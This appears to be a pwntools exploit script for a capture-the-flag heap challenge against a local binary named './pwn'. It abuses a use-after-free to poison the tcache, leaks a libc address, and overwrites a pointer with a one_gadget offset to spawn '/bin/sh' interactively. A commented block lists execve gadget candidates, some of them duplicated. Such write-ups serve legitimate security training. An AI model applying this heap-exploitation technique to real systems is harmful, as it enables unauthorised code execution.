from pwn import *
context(log_level='debug')

# p = process(["/lib/x86_64-linux-gnu/ld-2.27.so", "./pwn"], env={"LD_PRELOAD":"./libc.so.6"})
sh = process("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(index,size):
	sh.recvuntil(">> \n")
	sh.sendline("1")
	sh.recvuntil(" index\n")
	sh.sendline(str(index))
	sh.recvuntil(" size")
	sh.sendline(str(size))
def delete(index):
	sh.recvuntil(">> \n")
	sh.sendline("2")
	sh.recvuntil(" index\n")
	sh.sendline(str(index))	
def edit(index,content):
	sh.recvuntil(">> \n")
	sh.sendline("3")
	sh.recvuntil(" index\n")
	sh.sendline(str(index))
	sh.recvuntil("content\n")
	sh.send(content)
def show(index):
	sh.recvuntil(">> \n")
	sh.sendline("4")
	sh.recvuntil(" index\n")
	sh.sendline(str(index))
def editname(name):
	sh.recvuntil(">> \n")
	sh.sendline("5")
	sh.recvuntil("ame:\n")
	sh.send(name)
def showname():
	sh.recvuntil(">> \n")
	sh.sendline("6")
add(0,0x20)
add(1,0x30)


for i in range(8):
	delete(0)
	edit(0,p64(0))
for i in range(8):
	delete(1)
	edit(1,p64(0))

gdb.attach(sh)
editname('\x28')
show(0)
addr = u64(sh.recv(6).ljust(8,'\x00'))
print 'addr:'+hex(addr)
libc_base = addr - 0x3ebc28
print 'libc_base:'+hex(libc_base)
add(0,0x20)
add(0,0x20)
edit(0,p64(libc_base+0xe5622))
sh.recvuntil(">> \n")
sh.sendline("1")
sh.recvuntil(" index\n")
sh.sendline("2")
sh.recvuntil("input size")
sh.sendline("60")
#attach(sh)
'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe5617 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe561e execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe5622 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x10a428 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL

'''


sh.interactive()
